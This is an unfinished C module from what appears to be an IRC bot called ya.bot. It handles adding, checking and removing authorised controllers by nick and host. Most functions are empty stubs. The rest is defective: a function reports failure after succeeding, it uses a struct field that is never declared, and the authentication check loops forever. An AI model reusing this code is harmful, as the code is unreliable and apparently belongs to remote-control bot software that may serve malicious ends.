/*  ya.bot  */

#include "bot.h"

// FIXME finish this.. :)

/*
struct SAuthedUsers
{
	char m_szNick[32];
	char m_szHost[LOWBUF];
};

static (global) SAuthedUsers *authedUsers;
static UINT authCount;
authCount++;
authedUsers = realloc( authedUsers, authCount * sizeof(SAuthedUsers));
authedUsers[authCount - 1].m_szNick = newUser;
authedUsers[authCount - 1].m_szHost = newHost;

http://www.cs.cf.ac.uk/Dave/C/node11.html
http://www.cee.hw.ac.uk/~rjp/Coursewww/Cwww/linklist.html
*/

bool userctrl_useradd(DWORD dwUserName,
		DWORD dwUserPassword,
		char *pszHostAuth,
		bool bCryptedCommuncation,
		int nLevel,
		char *pszNick,
		char *pszHost)
{
		return TRUE;
}

bool userctrl_userremove(DWORD dwUserName)
{
		return TRUE;
}

bool userctrl_authadd(char *pszNick, char *pszHost)
{
	SAuthedUsers *s_au = NULL;
		s_au = (SAuthedUsers *)malloc(sizeof(*s_au));
	if (!s_au)
			return FALSE;
		strncpy(s_au->m_szNick, pszNick, sizeof(s_au->m_szNick) - 1);
		strncpy(s_au->m_szHost, pszHost, sizeof(s_au->m_szHost) - 1);
		s_au->m_SLink = g_authedusers;
		g_authedusers = s_au;
		return FALSE;
}

bool userctrl_authcheck(char *pszNick, char *pszHost)
{
	SAuthedUsers *s_au;
		s_au = g_authedusers;
	while (s_au)
	{
		if ((strcmp(s_au->m_szNick, pszNick) == 0) && (strcmp(s_au->m_szHost, pszHost) == 0))
				return TRUE;
	}
		return FALSE;
}

bool userctrl_authremove(DWORD dwUserName)
{
		return TRUE;
}
